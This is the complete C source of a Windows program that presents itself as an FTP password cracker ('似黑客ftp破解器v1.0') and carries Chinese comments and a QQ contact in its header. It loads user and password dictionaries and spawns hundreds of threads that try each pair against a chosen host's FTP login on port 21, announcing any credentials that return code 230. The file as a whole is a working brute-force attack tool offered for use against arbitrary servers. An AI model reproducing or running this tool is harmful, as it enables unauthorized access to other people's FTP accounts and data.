 /***********************************

  发现程序有什么问题，欢迎联系我。
        有什么需要改的也可以交流。
        希望能更大家多多交流。
                QQ:841116165

 *************************************/
#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <malloc.h>
#include <string.h>
#pragma comment(lib,"ws2_32.lib")
#define USER "users.txt"
#define DIC "pass.txt"

char inurl[100]="";
int nThread=0;
int MaxThread=300;
char user[50]="",pass[50]="";

char *userh, *passh, *userp, *passp;

//加载字典
char * LoadFile(char *file)
{
        char *hdic=0;
        int num=0;
        FILE *fr = fopen(file,"rb");
        if (fr==NULL)
        {
                return 0;
        }
        fseek(fr,0,SEEK_END);
        num = ftell(fr);
        hdic = (char*)malloc(sizeof(char)*(num+10));
        strnset(hdic, '\0', num+10);
        //复位文件指针
        rewind(fr);
        //读入内存
        fread(hdic,num,1,fr);
        //关闭文件指针
        fclose(fr);
        if (hdic == NULL) return 0;
        return hdic;
}


int CheckLogin()
{
        WSADATA ws;
        SOCKET s;
        char usert[20]="",passt[20]="";
        char sendbuf[BUFSIZ]="",recvbuf[BUFSIZ]="",result[100]="";
        struct sockaddr_in sa;
        struct hostent* url;
        WSAStartup(MAKEWORD(1,1),&ws);
        strcpy(usert,user);
        strcpy(passt,pass);
        printf("\n正在尝试:%s\\%s\t\t实际创建了%d个线程.....",usert,passt, nThread);
        s = socket(AF_INET,SOCK_STREAM, 0);
        
        url = gethostbyname(inurl);
        
        //        printf("connect:%s\n",inet_ntoa(*((struct in_addr *)url->h_addr)));
        sa.sin_addr.S_un.S_addr = inet_addr(inet_ntoa(*((struct in_addr *)url->h_addr)));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(21);
        
        if (SOCKET_ERROR==connect(s, (struct sockaddr*)&sa, sizeof(sa)))
        {
                printf("\n=Connect Error=");
                return 0;
        }
        
        
        //组织ftp协议登陆数据
        strcat(sendbuf,"user ");
        strcat(sendbuf,usert);
        strcat(sendbuf,"\r\n");
        //接受来自ftp服务器的响应
        recv(s,recvbuf, BUFSIZ, 0);
        //        printf("SEND:%s\n",sendbuf);
        //发送用户名
        send(s,sendbuf,strlen(sendbuf),0);
        
        recv(s,recvbuf, BUFSIZ, 0);
        
        //        printf("RECV:%s\n",recvbuf);
        
        strnset(recvbuf, 0, BUFSIZ);
        
        strnset(sendbuf,0,BUFSIZ);
        
        strcat(sendbuf,"pass ");
        strcat(sendbuf,passt);
        strcat(sendbuf,"\r\n\r\n");
        //        printf("SEND:%s\n",sendbuf);
        //发送密码数据包
        send(s,sendbuf,strlen(sendbuf),0);
        
        recv(s,recvbuf, BUFSIZ, 0);
        //        printf("%s\n",recvbuf);
        //登陆成功返回230
        printf("\n已 猜 解:%s\\%s\t",usert,passt);
        if(strncmp(recvbuf,"230",3)==0)
        {
                send(s,"quit\r\n\r\n", 8,0);
                recv(s,recvbuf, BUFSIZ, 0);
                
                //        printf("RECV:%s\n",recvbuf);
                //将密码显示在屏幕上
                sprintf(result, "\n\n\t\t\t恭喜您\n\n\t\t用户名:%s\n\t\t密码:%s\n\n",usert,passt);
                nThread=-100;
        
                system("color 4f&cls");
                printf("%s",result);
                
                
        }
        send(s,"quit\r\n\r\n", 8,0);
        recv(s,recvbuf, BUFSIZ, 0);
        
        //        printf("RECV:%s\n",recvbuf);
        closesocket(s);
        WSACleanup();
        
        return 0;
}

DWORD WINAPI ThreadCheckUser(LPVOID pParam)
{
        if(nThread <0) return 0;
        nThread+=1;
        
        CheckLogin();
        nThread-=1;
        return 0;
        
}

void usage()
{
        system("cls");
        printf("\n\t工具名称:似黑客ftp破解器v1.0\n\n\t\t\t用法示范: \n\t\tsiftp.exe www.zixue7.com 500\n\t\tsiftp.exe www.zixue7.com 1000\n\t\tsiftp.exe www.zixue7.com\n\t\twww.zixue7.com是你想猜解的ftp服务器地址.\n\t\t500是线程数,如果不加线程选项，默认为300\n\n\t\t\t\t\t\tBY:似黑客学院编程小组\n");
}

int main(int argc, char *argv[])
{
        
        
        int n=0;  //记录用户或密码字符串长度
        
        
        DWORD threadId=0;
        char title[100]="";
        system("color 0e&title 似黑客ftp破解器v1.0 - www.sihack.com");
        if(argc != 2 && argc != 3)
        {
                usage();
                system("pause");
                return 0;
        }
        else
        {
                strcpy(inurl, argv[1]);
                argc>=3?MaxThread = atoi(argv[2]):0;

        //        printf("----------%d----------",atoi(argv[2]));
        //        if(strlen(argv[2]) > 0 && strlen(argv[2])<5) MaxThread = );
        }
        sprintf(title,"title 正在破解 %s %d - 自学去-自学编程-www.zixue7.com",argv[1],MaxThread);
        system(title);
        //把字典加载到内存
        if((userp=LoadFile(USER))==0)
        {
                printf("%s文件加载失败\n",USER);
                return 0;
        }
        if((passp=LoadFile(DIC))==0)
        {
                printf("%s文件加载失败\n",DIC);
                return 0;
        }
        
        userh = userp;
        do
        {
                passh = passp;
                for (n=0; *userh != '\n' && *userh != '\0'; ++userh,++n);
                strnset(user, 0, 50);
                strncpy(user, userh-n, *userh == '\0'?n:n-1);
                userh++;
                //        printf("%s",user);
                do
                {
                        for (n=0; *passh != '\n' && *passh != '\0'; ++passh,++n);
                        strnset(pass, 0, 50);
                        strncpy(pass, passh-n, *passh == '\0'?n:n-1);
                        passh++;
                        //        printf("%s",pass);
                        CreateThread(NULL, 0, ThreadCheckUser,NULL, 0, &threadId);
                        Sleep(50);
                        if(nThread <0){
                                return 0;
                        }
loop:
                        if(nThread > MaxThread)
                        {
                                Sleep(500);
                                goto loop;
                        }
                        
                        //        if(CheckLogin()) return 0;
                }while(*passh != '\0');
        }while(*userh != '\0');
        
        while(nThread>0)
        {
                Sleep(1000);
        }
        //CheckLogin("niaoniao","admin841116165");
        printf("\n\n很遗憾,没有猜解到。\n");
        system("color 8f");
        return 0;
}

